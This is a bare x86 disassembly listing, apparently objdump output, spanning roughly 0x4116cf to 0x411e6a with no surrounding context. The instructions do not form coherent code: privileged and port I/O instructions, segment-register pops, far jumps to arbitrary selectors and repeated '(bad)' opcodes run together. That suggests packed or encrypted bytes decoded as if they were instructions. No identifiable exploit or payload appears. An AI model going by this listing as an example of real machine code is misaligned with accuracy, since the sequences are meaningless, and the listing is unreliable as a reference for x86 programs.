  4116cf:	mov    eax,0x9c3c97ef
  4116d4:	das    
  4116d5:	jnp    0x41168b
  4116d7:	add    ecx,DWORD PTR [edi+0x1ad6cd45]
  4116dd:	jecxz  0x4116b6
  4116df:	stc    
  4116e0:	and    al,0xb5
  4116e2:	adc    DWORD PTR [ebx-0x5e815b30],edx
  4116e8:	jbe    0x4116d4
  4116ea:	mov    eax,0x8227d081
  4116ef:	ret    
  4116f0:	jns    0x411736
  4116f2:	inc    ecx
  4116f3:	mov    dl,BYTE PTR [ebx-0x4d]
  4116f6:	pop    ss
  4116f7:	je     0x411740
  4116f9:	cmp    al,0x3b
  4116fb:	jge    0x4116f1
  4116fd:	mov    dl,0x51
  4116ff:	icebp  
  411700:	pop    ecx
  411701:	push   ss
  411702:	mov    DWORD PTR ds:0x753d991f,ebp
  411709:	push   edi
  41170a:	pop    ss
  41170b:	cmp    dh,bh
  41170d:	mov    ebx,0x7c24b789
  411712:	mov    cl,0x95
  411714:	push   ss
  411715:	in     al,dx
  411716:	jnp    0x411710
  411718:	imul   esi,DWORD PTR [esi],0x1d
  41171b:	push   ebx
  41171c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41171d:	sbb    DWORD PTR [esi],0xffffffd5
  411720:	push   0x2d0724f0
  411725:	xchg   esi,eax
  411726:	xchg   ecx,eax
  411727:	mov    edi,0xfc6af9d9
  41172c:	je     0x411765
  41172e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41172f:	mov    esp,DWORD PTR [edi+esi*1]
  411732:	sub    al,0xc
  411734:	data16 sbb dl,al
  411737:	jl     0x411728
  411739:	pushf  
  41173a:	ins    DWORD PTR es:[edi],dx
  41173b:	mov    eax,ds:0x50c3ccee
  411740:	and    al,0xb2
  411742:	lods   eax,DWORD PTR ds:[esi]
  411743:	fs hlt 
  411745:	sub    BYTE PTR [edi],ch
  411747:	jecxz  0x41176e
  411749:	retf   0x7a87
  41174c:	ret    
  41174d:	mov    cl,0xb2
  41174f:	nop
  411750:	sbb    ecx,DWORD PTR [ebx+0x1f]
  411753:	ret    0x3cb1
  411756:	lods   al,BYTE PTR ds:[esi]
  411757:	xor    eax,0xe6a24d24
  41175c:	jb     0x41170d
  41175e:	lods   al,BYTE PTR ds:[esi]
  41175f:	jne    0x4117dc
  411761:	xor    DWORD PTR [esi+0x59],ebp
  411764:	enter  0x783b,0x90
  411768:	jge    0x41178a
  41176a:	sub    bl,BYTE PTR [esi+eiz*4]
  41176d:	sti    
  41176e:	popa   
  41176f:	call   FWORD PTR [ebx]
  411771:	dec    ebx
  411772:	jmp    0x411750
  411774:	stc    
  411775:	stc    
  411776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411777:	je     0x4117c1
  411779:	push   ebp
  41177a:	sub    edi,DWORD PTR cs:[eax+0x1dccefa1]
  411781:	out    dx,al
  411782:	mov    eax,0x5402809
  411787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411788:	int    0x64
  41178a:	xlat   BYTE PTR ds:[ebx]
  41178b:	xor    ebx,DWORD PTR [ecx+0x2a]
  41178e:	sbb    eax,0x31844759
  411793:	shr    DWORD PTR [esi],0x65
  411796:	cwde   
  411797:	xchg   edx,eax
  411798:	test   DWORD PTR [ebx],edx
  41179a:	sbb    bl,BYTE PTR [ecx+0x6e7035df]
  4117a0:	sub    eax,0xd407aebb
  4117a5:	js     0x41172a
  4117a7:	mov    edx,0x7be7246d
  4117ac:	adc    ah,bl
  4117ae:	push   es
  4117af:	jmp    DWORD PTR [ebp-0x6dd19aad]
  4117b5:	sti    
  4117b6:	call   0xd635fc66
  4117bb:	retf   
  4117bc:	add    cl,BYTE PTR [ecx]
  4117be:	dec    esi
  4117bf:	jb     0x4117ee
  4117c1:	clc    
  4117c2:	in     eax,dx
  4117c3:	push   0xdcfb0e11
  4117c8:	call   0x81dbf653
  4117cd:	add    eax,0xd61b5091
  4117d2:	fdivp  st(5),st
  4117d4:	or     DWORD PTR [ebx+0x16bb443a],0x895fc276
  4117de:	pop    ds
  4117df:	and    DWORD PTR [esi],0x7e
  4117e2:	jmp    0x50e8:0xd9d58bde
  4117e9:	pop    esi
  4117ea:	xchg   ebx,eax
  4117eb:	dec    edx
  4117ec:	cmp    ebp,0xffffff89
  4117ef:	into   
  4117f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117f1:	mov    bh,0x7c
  4117f3:	gs hlt 
  4117f5:	test   eax,0x7b0a288b
  4117fa:	pusha  
  4117fb:	sbb    al,BYTE PTR [ecx+0xa2fc2c6]
  411801:	jecxz  0x4117f6
  411803:	call   0xa98a:0xed202587
  41180a:	(bad)  
  41180b:	push   ss
  41180c:	xor    BYTE PTR [eax],bh
  41180e:	test   cl,cl
  411810:	or     al,0x84
  411812:	dec    eax
  411813:	mov    al,ds:0x90338129
  411818:	popf   
  411819:	in     eax,0xe
  41181b:	mov    bh,0x96
  41181d:	sahf   
  41181e:	iret   
  41181f:	ins    BYTE PTR es:[edi],dx
  411820:	push   ebp
  411821:	add    al,0xaa
  411823:	leave  
  411824:	int3   
  411825:	cld    
  411826:	xchg   edx,eax
  411827:	pop    ebp
  411828:	mov    eax,ds:0x2fe8fc7e
  41182d:	and    ebp,edi
  41182f:	or     BYTE PTR [ebp+0x55],cl
  411832:	iret   
  411833:	mov    esp,0x6a918a57
  411838:	mov    eax,ds:0xbd5e7c86
  41183d:	sbb    dh,ch
  41183f:	jb     0x411836
  411841:	test   eax,0x4bcdb07c
  411846:	xchg   BYTE PTR [ebx+ebp*2-0x59296703],ah
  41184d:	push   eax
  41184e:	xchg   ebx,eax
  41184f:	fadd   st,st(5)
  411851:	int    0xdc
  411853:	pop    ds
  411854:	repnz sbb al,0x18
  411857:	mov    bh,0x59
  411859:	push   ebp
  41185a:	je     0x411862
  41185c:	scas   al,BYTE PTR es:[edi]
  41185d:	gs dec eax
  41185f:	push   cs
  411860:	jnp    0x4118d1
  411862:	jmp    0x4118d7
  411864:	add    al,0x16
  411866:	fcom   DWORD PTR [eax-0x4ec526f0]
  41186c:	jb     0x4118ca
  41186e:	adc    BYTE PTR [esi],0x51
  411871:	stos   DWORD PTR es:[edi],eax
  411872:	not    BYTE PTR [edi-0x55]
  411875:	test   al,0xd9
  411877:	cmp    ch,BYTE PTR [edi+0x22]
  41187a:	push   eax
  41187b:	xchg   BYTE PTR [ebx-0x709b8663],dl
  411881:	push   0x51ffe21f
  411886:	(bad)  
  411887:	pop    ebx
  411888:	sbb    eax,0xf76786a0
  41188d:	loopne 0x411823
  41188f:	or     eax,0x30448ca7
  411894:	jle    0x411915
  411896:	pushf  
  411897:	xchg   ecx,eax
  411898:	into   
  411899:	xchg   DWORD PTR [ecx],ebp
  41189b:	and    ebp,esi
  41189d:	lods   al,BYTE PTR ds:[esi]
  41189e:	adc    al,0xf7
  4118a0:	xor    eax,0x5cc82124
  4118a5:	push   ecx
  4118a6:	ror    DWORD PTR [edx+edx*4],0x14
  4118aa:	xrelease xchg BYTE PTR [bx+di+0x7],bl
  4118af:	jl     0x4118e9
  4118b1:	add    cl,dl
  4118b3:	jae    0x41187f
  4118b5:	fdivr  DWORD PTR [ecx-0x47fd8968]
  4118bb:	sub    BYTE PTR [edi-0x218fd6c8],0x5c
  4118c2:	test   al,0x4
  4118c4:	mov    dl,0x89
  4118c6:	aaa    
  4118c7:	pop    ds
  4118c8:	cwde   
  4118c9:	dec    eax
  4118ca:	xlat   BYTE PTR ds:[ebx]
  4118cb:	jge    0x411936
  4118cd:	push   ecx
  4118ce:	(bad)  
  4118cf:	imul   ebx,esp,0x6afb9f9e
  4118d5:	inc    ecx
  4118d6:	ins    BYTE PTR es:[edi],dx
  4118d7:	jg     0x411891
  4118d9:	jecxz  0x41191a
  4118db:	push   ecx
  4118dc:	int3   
  4118dd:	cmp    BYTE PTR [edi-0x66],ch
  4118e0:	dec    eax
  4118e1:	push   ds
  4118e2:	dec    ebx
  4118e3:	js     0x41195f
  4118e5:	loope  0x4118e6
  4118e7:	es popf 
  4118e9:	and    ax,0x9b2e
  4118ed:	mov    edx,0x55e43408
  4118f2:	sbb    al,0xe2
  4118f4:	mov    dl,0x8f
  4118f6:	mov    edi,0xcda68225
  4118fb:	add    eax,0xae62e759
  411900:	cmp    ah,BYTE PTR [esp+edx*4]
  411903:	sti    
  411904:	fldcw  WORD PTR [esi]
  411906:	in     al,dx
  411907:	pop    eax
  411908:	push   ebx
  411909:	hlt    
  41190a:	pop    edx
  41190b:	sbb    edx,DWORD PTR [esi+ecx*1+0x38]
  41190f:	hlt    
  411910:	adc    dh,BYTE PTR [esi+0x7c]
  411913:	rol    BYTE PTR [ebp-0x6de75683],0x7f
  41191a:	xor    BYTE PTR [ebx+0x3c],0x1a
  41191e:	(bad)  
  411920:	cli    
  411921:	(bad)
  411924:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411925:	xchg   ebp,eax
  411926:	pop    ds
  411927:	jmp    0x4119a4
  411929:	popa   
  41192a:	dec    esi
  41192b:	push   0xc0981942
  411930:	mov    BYTE PTR [edx-0x1e],al
  411933:	mov    ebp,0x8c03c17f
  411938:	xchg   BYTE PTR [edi-0x2f],dh
  41193b:	jl     0x411925
  41193d:	rcl    BYTE PTR [edx],1
  41193f:	outs   dx,DWORD PTR ds:[esi]
  411940:	inc    esi
  411941:	xchg   ebp,eax
  411942:	in     al,dx
  411943:	stos   DWORD PTR es:[edi],eax
  411944:	js     0x41192e
  411946:	clc    
  411947:	iret   
  411948:	inc    edi
  411949:	test   DWORD PTR [edx],ecx
  41194b:	fbstp  TBYTE PTR ds:0x6df31107
  411951:	push   0x7917acbc
  411956:	scas   eax,DWORD PTR es:[edi]
  411957:	loopne 0x4118dd
  411959:	fbld   TBYTE PTR [ecx+0x1]
  41195c:	mov    dh,0x9f
  41195e:	iret   
  41195f:	aaa    
  411960:	fdivr  DWORD PTR [ebp+0x30]
  411963:	popf   
  411964:	mov    ebp,0x135ff8b5
  411969:	ds jb  0x411921
  41196c:	in     eax,dx
  41196d:	fsub   QWORD PTR [esp+edx*8]
  411970:	pop    ecx
  411971:	test   DWORD PTR [eax+0x648859b0],esp
  411977:	xor    al,0x37
  411979:	pop    edx
  41197a:	xor    bh,dl
  41197c:	dec    esp
  41197d:	cmp    ah,bl
  41197f:	in     al,dx
  411980:	add    eax,0x5215829f
  411985:	and    al,0x5a
  411987:	fcomp  st(4)
  411989:	bound  edx,QWORD PTR [ebx+0x4a0a092a]
  41198f:	dec    esi
  411990:	sbb    DWORD PTR [eax+0x64a8c846],0x705afe49
  41199a:	sbb    esi,DWORD PTR [esp+edx*8+0x34]
  41199e:	jge    0x4119ff
  4119a0:	xchg   edi,eax
  4119a1:	fs je  0x4119ff
  4119a4:	dec    esi
  4119a5:	loopne 0x411935
  4119a7:	mov    edx,0x5566b62c
  4119ac:	xor    DWORD PTR [ecx-0x6b],ecx
  4119af:	pop    es
  4119b0:	add    eax,0x9ec80254
  4119b5:	ds dec esi
  4119b7:	add    DWORD PTR [ecx-0x24e9db67],esi
  4119bd:	pop    eax
  4119be:	jne    0x41198e
  4119c0:	cmp    BYTE PTR [edx+0x46],ch
  4119c3:	shl    cl,cl
  4119c5:	mov    ah,0x69
  4119c7:	mov    es,WORD PTR [ecx]
  4119c9:	sbb    al,0x6d
  4119cb:	not    BYTE PTR [edi+ebp*2+0x6f]
  4119cf:	hlt    
  4119d0:	xchg   edi,eax
  4119d1:	adc    eax,0xdb54029c
  4119d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119d7:	int3   
  4119d8:	lds    ebx,FWORD PTR [eax]
  4119da:	sti    
  4119db:	inc    ebx
  4119dc:	mov    al,0x35
  4119de:	fnstenv [eax]
  4119e0:	in     eax,0x9
  4119e2:	scas   al,BYTE PTR es:[edi]
  4119e3:	jae    0x4119a5
  4119e5:	jmp    0x4119c5
  4119e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119e8:	test   BYTE PTR [edi-0x6fa4a22],0x7c
  4119ef:	xor    eax,0x20149481
  4119f4:	and    eax,0xac7563ed
  4119f9:	(bad)  
  4119fa:	int3   
  4119fb:	leave  
  4119fc:	sbb    eax,0x24aeb6d4
  411a01:	fwait
  411a02:	xor    ebp,DWORD PTR [ebx]
  411a04:	(bad)  
  411a05:	adc    eax,0xc762196c
  411a0a:	je     0x4119cd
  411a0c:	ror    ecx,0x4d
  411a0f:	jmp    0x411a53
  411a11:	enter  0xfbd5,0x9e
  411a15:	dec    ecx
  411a16:	inc    ebx
  411a17:	jne    0x4119cd
  411a19:	mov    esp,DWORD PTR [eax-0x758414bd]
  411a1f:	addr16 jb 0x4119f8
  411a22:	mov    edx,0x6f3087c0
  411a27:	mov    ecx,0x9dc40ec2
  411a2c:	jo     0x411a39
  411a2e:	pop    ebp
  411a2f:	inc    esi
  411a30:	fwait
  411a31:	dec    ebp
  411a32:	and    al,0x6
  411a34:	cmp    al,0xc0
  411a36:	retf   
  411a37:	ficom  DWORD PTR [esi+ebp*2]
  411a3a:	mov    ebp,0x6e646f16
  411a3f:	pop    eax
  411a40:	push   edi
  411a41:	xor    al,0xf8
  411a43:	cmp    eax,0xe6801db2
  411a48:	push   cs
  411a49:	xlat   BYTE PTR ds:[ebx]
  411a4a:	or     al,0x94
  411a4c:	cmp    BYTE PTR [edx+0x25],cl
  411a4f:	adc    eax,0x35e8317e
  411a54:	jbe    0x411a22
  411a56:	arpl   bp,bx
  411a58:	dec    edi
  411a59:	or     BYTE PTR [edi+eiz*2-0x67],al
  411a5d:	jno    0x411a34
  411a5f:	fmul   QWORD PTR [ebx-0x25]
  411a62:	div    DWORD PTR ds:0xa70d5121
  411a68:	mov    ecx,0x6862b9e
  411a6d:	cmp    eax,0xa90339d5
  411a72:	lds    edx,FWORD PTR [esi-0x5f]
  411a75:	dec    eax
  411a76:	sbb    eax,0x749d1ed
  411a7b:	(bad)  
  411a7c:	xor    ebx,DWORD PTR [esi+0x51]
  411a7f:	mov    bl,0x4d
  411a81:	pop    esi
  411a82:	retf   0x5a71
  411a85:	mov    al,ds:0x909ada7a
  411a8a:	test   ah,0x28
  411a8d:	out    dx,al
  411a8e:	outs   dx,BYTE PTR ds:[esi]
  411a8f:	rol    DWORD PTR [edi+0x4f236998],cl
  411a95:	and    eax,0x7f018d65
  411a9a:	sub    al,0xbb
  411a9c:	dec    edx
  411a9d:	nop
  411a9e:	dec    ebx
  411a9f:	mov    bl,0x67
  411aa1:	sbb    edx,edx
  411aa3:	pop    ds
  411aa4:	aas    
  411aa5:	addr16 (bad) 
  411aa7:	fadd   DWORD PTR [edx]
  411aa9:	sub    DWORD PTR [edx+0x3b185827],0x4c3f5ee4
  411ab3:	call   0x5833:0xfe070fec
  411aba:	push   ss
  411abb:	mov    dl,0x5b
  411abd:	icebp  
  411abe:	or     ebp,DWORD PTR [edi+0x5370c4b3]
  411ac4:	inc    edx
  411ac5:	or     al,0x40
  411ac7:	sbb    ebp,DWORD PTR [eax+0x68]
  411aca:	aas    
  411acb:	data16 je 0x411add
  411ace:	sbb    BYTE PTR [edi-0x49],bh
  411ad1:	xchg   ebp,eax
  411ad2:	push   edx
  411ad3:	add    al,0xf2
  411ad5:	sub    ebx,ecx
  411ad7:	push   cs
  411ad8:	adc    BYTE PTR [ecx-0x285bbe49],dl
  411ade:	push   edi
  411adf:	add    DWORD PTR [ebx],0xde90cfd
  411ae5:	outs   dx,DWORD PTR ds:[esi]
  411ae6:	fstp   QWORD PTR [edi-0x1da22782]
  411aec:	or     ah,ch
  411aee:	fiadd  WORD PTR [ebp-0x40]
  411af1:	mov    al,ds:0xb8db3bfd
  411af7:	aam    0xe7
  411af9:	fwait
  411afa:	push   esi
  411afb:	sub    bh,BYTE PTR [eax]
  411afd:	mov    al,0x86
  411aff:	xchg   BYTE PTR [edx+0xcd7067b],dl
  411b05:	push   ds
  411b06:	mov    cs,WORD PTR [eax+eiz*1]
  411b09:	leave  
  411b0a:	mov    ?,WORD PTR [edx-0x47a30425]
  411b10:	mov    ebx,0x3e8dd6ed
  411b15:	mov    ah,0x22
  411b17:	arpl   WORD PTR [ebx-0x773c52b4],bx
  411b1d:	lds    ecx,FWORD PTR [edi+0x16]
  411b20:	mov    eax,ds:0xd1e8c103
  411b25:	in     eax,0xc8
  411b27:	push   eax
  411b28:	mov    esi,0x9ade10b2
  411b2d:	xchg   BYTE PTR [edx+0x4be33bb9],ch
  411b33:	aad    0xd1
  411b35:	or     eax,DWORD PTR [ebx+0xe]
  411b38:	inc    edx
  411b39:	imul   dl
  411b3b:	rcl    BYTE PTR [edx+ebx*2],cl
  411b3e:	xor    DWORD PTR [ebp+0x3f986361],ebp
  411b44:	jecxz  0x411b95
  411b46:	pop    ebx
  411b47:	rcl    DWORD PTR [ebx-0xbd78b41],0x1f
  411b4e:	sub    BYTE PTR [edi],dh
  411b50:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  411b52:	fadd   st,st(5)
  411b54:	adc    edi,DWORD PTR [edx+0x34916d2]
  411b5a:	xchg   ebx,eax
  411b5b:	test   BYTE PTR [ecx],dh
  411b5d:	adc    esi,DWORD PTR [eax-0x18]
  411b60:	xor    BYTE PTR [edi-0x62],0x16
  411b64:	ja     0x411bc1
  411b66:	mov    dl,0x2d
  411b68:	lods   al,BYTE PTR ds:[esi]
  411b69:	mov    BYTE PTR [eax-0x677e12b8],dl
  411b6f:	xor    al,0x27
  411b71:	mov    ecx,0x59284926
  411b76:	push   cs
  411b77:	pop    esp
  411b78:	jb     0x411b17
  411b7a:	cmp    edi,ebp
  411b7c:	pop    ss
  411b7d:	jne    0x411bcb
  411b7f:	rcr    BYTE PTR [edx],0x28
  411b82:	leave  
  411b83:	int    0x88
  411b85:	push   esi
  411b86:	xchg   ebx,eax
  411b87:	sti    
  411b88:	mov    ebx,0x1913ebc6
  411b8d:	aas    
  411b8e:	xor    BYTE PTR [edi-0x2],dh
  411b91:	mov    ah,0x9b
  411b93:	lods   al,BYTE PTR ds:[esi]
  411b94:	gs inc esi
  411b96:	or     ch,0xe
  411b99:	cmp    bh,ch
  411b9b:	in     al,dx
  411b9c:	adc    eax,0x65fdc06c
  411ba1:	push   ecx
  411ba2:	add    eax,0x4969926f
  411ba7:	cmp    eax,DWORD PTR [ebp+0x5410e4c4]
  411bad:	(bad)  
  411bae:	dec    ebx
  411baf:	sub    BYTE PTR ds:0xf5b1eaac,bl
  411bb5:	es cmp eax,0xd89dd1bc
  411bbb:	or     cl,bh
  411bbd:	dec    esi
  411bbe:	cdq    
  411bbf:	pusha  
  411bc0:	sti    
  411bc1:	dec    ebx
  411bc2:	out    0xf3,al
  411bc4:	jne    0x411b7a
  411bc6:	dec    edx
  411bc7:	out    0x9,al
  411bc9:	leave  
  411bca:	inc    esi
  411bcb:	lock lods eax,DWORD PTR ds:[esi]
  411bcd:	fisttp DWORD PTR [edi]
  411bcf:	adc    eax,0x908ce320
  411bd4:	mul    DWORD PTR [edx+0x5a7108c0]
  411bda:	mov    BYTE PTR ds:0xcf8a4e21,bh
  411be0:	adc    eax,esp
  411be2:	loopne 0x411b6d
  411be4:	pushf  
  411be5:	xor    esi,ebx
  411be7:	push   edi
  411be8:	dec    edi
  411be9:	pusha  
  411bea:	mov    WORD PTR [esi+0x6e7e16c5],?
  411bf0:	xchg   DWORD PTR [edi-0x5feab4ed],edx
  411bf6:	scas   al,BYTE PTR es:[edi]
  411bf7:	loopne 0x411c70
  411bf9:	repnz push esi
  411bfb:	mov    edx,0x7c83f0a7
  411c00:	sub    esp,DWORD PTR [esi+0x28]
  411c03:	rol    ah,1
  411c05:	or     al,0x1d
  411c07:	scas   eax,DWORD PTR es:[edi]
  411c08:	pop    ecx
  411c09:	pop    ds
  411c0a:	out    0xe9,al
  411c0c:	mov    BYTE PTR [esi-0x49],ch
  411c0f:	push   ds
  411c10:	mov    BYTE PTR ds:0xff80d17a,al
  411c16:	inc    edx
  411c17:	in     eax,0x8b
  411c19:	ror    BYTE PTR [edx+0x12],0xe9
  411c1d:	cdq    
  411c1e:	and    DWORD PTR [ebp-0x33ddcb2f],ecx
  411c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c25:	inc    esi
  411c26:	sbb    eax,0xd0b39e6b
  411c2b:	jns    0x411c0a
  411c2d:	fwait
  411c2e:	cld    
  411c2f:	pop    eax
  411c30:	lahf   
  411c31:	ja     0x411c8a
  411c33:	dec    esi
  411c34:	lock fcom QWORD PTR [edi-0x6e123226]
  411c3b:	nop
  411c3c:	pop    es
  411c3d:	test   ebx,eax
  411c3f:	loope  0x411c47
  411c41:	inc    edi
  411c42:	popa   
  411c43:	fild   DWORD PTR [ebp+0x16]
  411c46:	mov    dh,ch
  411c48:	jmp    0x411c85
  411c4a:	cmp    al,0x9
  411c4c:	sub    cl,BYTE PTR [ebx]
  411c4e:	out    0x94,eax
  411c50:	pop    edi
  411c51:	mov    ecx,0x62d3ad6d
  411c56:	xor    eax,0x7344c329
  411c5b:	inc    edi
  411c5c:	jo     0x411c1b
  411c5e:	xchg   edi,eax
  411c5f:	inc    ebp
  411c60:	pop    es
  411c61:	sti    
  411c62:	sbb    dl,0x48
  411c65:	arpl   WORD PTR [edx],cx
  411c67:	inc    edi
  411c68:	pop    ebx
  411c69:	jns    0x411c97
  411c6b:	cmp    edx,DWORD PTR [eax]
  411c6d:	imul   edx,esi,0xb3c08cb6
  411c73:	push   edx
  411c74:	out    dx,eax
  411c75:	pushf  
  411c76:	enter  0x5edb,0x33
  411c7a:	push   esi
  411c7b:	test   BYTE PTR [edx-0x6158c34f],dl
  411c81:	jbe    0x411cc8
  411c83:	jg     0x411c74
  411c85:	cwde   
  411c86:	retf   
  411c87:	or     eax,DWORD PTR [ebx+0x0]
  411c8a:	cld    
  411c8b:	(bad)  
  411c8c:	jb     0x411c69
  411c8e:	push   es
  411c8f:	popa   
  411c90:	stc    
  411c91:	stc    
  411c92:	out    0xb4,al
  411c94:	xor    esp,DWORD PTR [ebx+edi*1+0x55]
  411c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c99:	mov    al,0xad
  411c9b:	jnp    0x411c5e
  411c9d:	mov    esi,0x29f22d3a
  411ca2:	popa   
  411ca3:	sub    eax,0x6ff6f597
  411ca8:	mov    bl,0x5b
  411caa:	push   edx
  411cab:	stos   BYTE PTR es:[edi],al
  411cac:	sbb    al,0xd3
  411cae:	call   0x9bdfec8d
  411cb3:	and    al,BYTE PTR [edi+ecx*8]
  411cb6:	xor    DWORD PTR ds:0xbf3ee720,eax
  411cbc:	rcr    DWORD PTR [esi+ebx*4+0x2d],cl
  411cc0:	stc    
  411cc1:	mov    cl,0x1
  411cc3:	stc    
  411cc4:	test   esp,eax
  411cc6:	xchg   esi,eax
  411cc7:	sub    al,0x20
  411cc9:	sub    esi,ecx
  411ccb:	pop    ss
  411ccc:	pusha  
  411ccd:	dec    edx
  411cce:	stc    
  411ccf:	(bad)  
  411cd0:	leave  
  411cd1:	add    eax,0x68a2e9bf
  411cd6:	sub    dl,BYTE PTR [edi]
  411cd8:	fdiv   DWORD PTR [eax-0x41467a91]
  411cde:	pop    ss
  411cdf:	adc    DWORD PTR [ebx+eiz*4+0x7b9a0ed7],edi
  411ce6:	fsubr  QWORD PTR [ebx]
  411ce8:	scas   eax,DWORD PTR es:[edi]
  411ce9:	std    
  411cea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ceb:	sub    BYTE PTR [ecx+0x2c],ah
  411cee:	ins    DWORD PTR es:[edi],dx
  411cef:	or     al,0x8e
  411cf1:	mov    BYTE PTR [ebp+0x1],cl
  411cf4:	and    DWORD PTR [eax+0x68f1d877],esi
  411cfa:	imul   esi,DWORD PTR [edx-0x19],0x14
  411cfe:	pusha  
  411cff:	push   esp
  411d00:	inc    ebx
  411d01:	or     ebx,esp
  411d03:	pop    edi
  411d04:	ret    
  411d05:	into   
  411d06:	push   esi
  411d07:	inc    edi
  411d08:	mov    al,ds:0x999afaf0
  411d0d:	fcomp  DWORD PTR [ecx+0x4f9806ec]
  411d13:	mov    al,0x9d
  411d15:	data16 ja 0x411cdd
  411d18:	repnz nop
  411d1a:	adc    al,0x57
  411d1c:	(bad)  
  411d1d:	mov    ch,0xdf
  411d1f:	sbb    eax,0x22570ab6
  411d24:	icebp  
  411d25:	imul   eax,DWORD PTR [edi],0x7e
  411d28:	es fcmovu st,st(2)
  411d2b:	dec    esp
  411d2c:	outs   dx,DWORD PTR ds:[esi]
  411d2d:	dec    esp
  411d2e:	push   esi
  411d2f:	mov    bl,0x4b
  411d31:	lahf   
  411d32:	mov    eax,ss
  411d34:	test   DWORD PTR [ecx+0x78],esp
  411d37:	xchg   edx,eax
  411d38:	scas   eax,DWORD PTR es:[edi]
  411d39:	(bad)  
  411d3a:	scas   al,BYTE PTR es:[edi]
  411d3b:	int    0x49
  411d3d:	jp     0x411cf1
  411d3f:	vsubsd xmm7,xmm6,QWORD PTR [edi-0x19]
  411d44:	call   0x99b7:0xb94d91d8
  411d4b:	int    0x81
  411d4d:	mov    DWORD PTR [esi-0x18],esi
  411d50:	paddb  mm7,QWORD PTR [edx]
  411d53:	cdq    
  411d54:	out    0x6b,al
  411d56:	shl    BYTE PTR [ebp-0x28],0x7
  411d5a:	push   esp
  411d5b:	jp     0x411d24
  411d5d:	rol    edx,0xb0
  411d60:	not    DWORD PTR [edx+0x49]
  411d63:	scas   al,BYTE PTR es:[edi]
  411d64:	mov    eax,ds:0xf3d7834d
  411d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d6a:	jae    0x411dbd
  411d6c:	fs pop ss
  411d6e:	out    0x75,al
  411d70:	push   ss
  411d71:	push   ds
  411d72:	out    dx,eax
  411d73:	int    0xa1
  411d75:	sbb    ebp,DWORD PTR [eax+esi*4-0x74]
  411d79:	add    cl,bh
  411d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d7c:	dec    ebp
  411d7d:	cld    
  411d7e:	xchg   edx,eax
  411d7f:	adc    DWORD PTR [eax],eax
  411d81:	outs   dx,DWORD PTR ds:[esi]
  411d82:	push   ecx
  411d84:	push   edi
  411d85:	arpl   di,dx
  411d87:	mov    ebx,0x5cbf3ac0
  411d8c:	adc    bl,BYTE PTR [ecx-0x44e86a77]
  411d92:	jbe    0x411d28
  411d94:	sub    eax,0x1a321511
  411d99:	add    dh,BYTE PTR [ebp+0x79]
  411d9c:	mov    cl,0x68
  411d9e:	js     0x411e1b
  411da0:	inc    edi
  411da1:	mov    edi,0x77e7f7cf
  411da6:	scas   al,BYTE PTR es:[edi]
  411da7:	xchg   BYTE PTR [esi],ah
  411da9:	xor    bl,BYTE PTR ds:0xee922b3d
  411daf:	jecxz  0x411d33
  411db1:	jle    0x411d72
  411db3:	mov    ds:0x34681e0f,eax
  411db8:	cmp    DWORD PTR [eax],ebx
  411dba:	mov    esi,0x9a836740
  411dbf:	fistp  WORD PTR [esi+esi*4]
  411dc2:	setb   BYTE PTR [esi-0x69]
  411dc6:	div    bl
  411dc8:	jne    0x411ddf
  411dca:	aaa    
  411dcb:	jne    0x411d61
  411dcd:	std    
  411dce:	sbb    BYTE PTR [edx],ch
  411dd0:	cs dec esi
  411dd2:	and    eax,0x6261341f
  411dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd8:	xchg   esp,eax
  411dd9:	or     cl,ah
  411ddb:	sbb    esi,edx
  411ddd:	je     0x411dcf
  411ddf:	jns    0x411de7
  411de1:	jns    0x411d75
  411de3:	xor    BYTE PTR [edx+0xf],bl
  411de6:	fdiv   QWORD PTR [ebp-0x18]
  411de9:	xor    al,0xb7
  411deb:	xor    al,0x17
  411ded:	sbb    DWORD PTR [ebp-0xe018848],edi
  411df3:	das    
  411df4:	and    ah,BYTE PTR [esi-0x29f28792]
  411dfa:	gs pop esp
  411dfc:	xor    dl,BYTE PTR [edi+0x3]
  411dff:	mov    eax,ds:0x1d94200e
  411e04:	mov    ebx,0xcf3b34c2
  411e09:	ficom  WORD PTR [esi]
  411e0b:	and    DWORD PTR [edi+0xfccbca2],ecx
  411e11:	pop    eax
  411e12:	pusha  
  411e13:	(bad)  
  411e14:	in     eax,dx
  411e15:	icebp  
  411e16:	push   esi
  411e17:	jb     0x411dca
  411e19:	div    esp
  411e1b:	pusha  
  411e1c:	loop   0x411df5
  411e1e:	push   ebp
  411e1f:	add    DWORD PTR [edx],eax
  411e21:	out    0x95,eax
  411e23:	jmp    0x78c8:0x8e6656e7
  411e2a:	pop    edx
  411e2b:	repz dec ebx
  411e2d:	xor    esi,DWORD PTR [edi]
  411e2f:	jno    0x411e60
  411e31:	ficom  WORD PTR [esi]
  411e33:	pop    ebx
  411e34:	add    al,ch
  411e36:	test   eax,0x99c5e705
  411e3b:	test   al,0x63
  411e3d:	xlat   BYTE PTR ds:[ebx]
  411e3e:	sub    ecx,DWORD PTR [edi-0x7d]
  411e41:	add    eax,0xfc3cc978
  411e46:	xchg   ebx,eax
  411e47:	and    ch,dh
  411e49:	xchg   esp,eax
  411e4a:	and    eax,ebx
  411e4c:	jnp    0x411e21
  411e4e:	sub    esi,DWORD PTR [esi-0x5]
  411e51:	pushf  
  411e52:	cdq    
  411e53:	and    eax,0x4192a048
  411e58:	adc    bh,dh
  411e5a:	and    DWORD PTR [eax-0x70],ebp
  411e5d:	adc    al,0x65
  411e5f:	(bad)  
  411e60:	loope  0x411e99
  411e62:	pop    ebp
  411e63:	mov    ebp,0x626241f5
  411e68:	or     ah,BYTE PTR [edx]
  411e6a:	mov    dh,BYTE PTR [esi-0xb76fd1e]
